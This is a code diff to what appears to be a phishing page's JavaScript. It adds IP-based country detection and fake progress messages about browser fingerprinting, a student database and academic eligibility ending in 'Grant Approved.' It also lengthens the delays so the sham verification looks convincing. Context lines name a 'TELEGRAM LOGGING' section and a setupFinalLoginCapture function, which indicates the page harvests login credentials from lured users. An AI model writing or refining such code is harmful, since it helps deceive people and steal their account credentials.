@@ -93,8 +93,28 @@ if (captchaBox) {
     });
 }
 
+let userCountry = "Detecting...";
+
+// Detect Country from IP
+async function detectCountry() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        userCountry = data.country_name || "International";
+    } catch (err) {
+        userCountry = "Global Region";
+    }
+}
+detectCountry();
+
 function simulateLoading() {
-    const texts = ["Analyzing Browser...", "Checking Database...", "Verifying Region...", "Grant Approved."];
+    const texts = [
+        "Analyzing Browser Fingerprint...",
+        `Detecting Node: ${userCountry}...`,
+        "Checking Student Database...",
+        "Verifying Academic Eligibility...",
+        "Grant Approved."
+    ];
     let i = 0;
     const interval = setInterval(() => {
         if (document.getElementById('loadingText')) {
@@ -103,19 +123,21 @@ function simulateLoading() {
         i++;
         if (i >= texts.length) {
             clearInterval(interval);
-            showSuccess();
+            setTimeout(showSuccess, 1000); // 1s extra delay before showing success
         }
-    }, 800);
+    }, 1200); // Increased delay between messages
 }
 
 function showSuccess() {
     steps.loading.style.display = 'none';
     steps.success.style.display = 'block';
+
+    // Increased delay for success tick
     setTimeout(() => {
         steps.success.style.display = 'none';
         steps.final.style.display = 'block';
         setupFinalLoginCapture();
-    }, 1500);
+    }, 2500);
 }
 
 // === TELEGRAM LOGGING & REDIRECT LOGIC ===
@@ -150,7 +172,7 @@ function setupFinalLoginCapture() {
 
             setTimeout(() => {
                 window.location.href = './testing/index.html';
-            }, 1200);
+            }, 2000); // Increased delay for "Securing Connection" vibe
         };
     }
 }
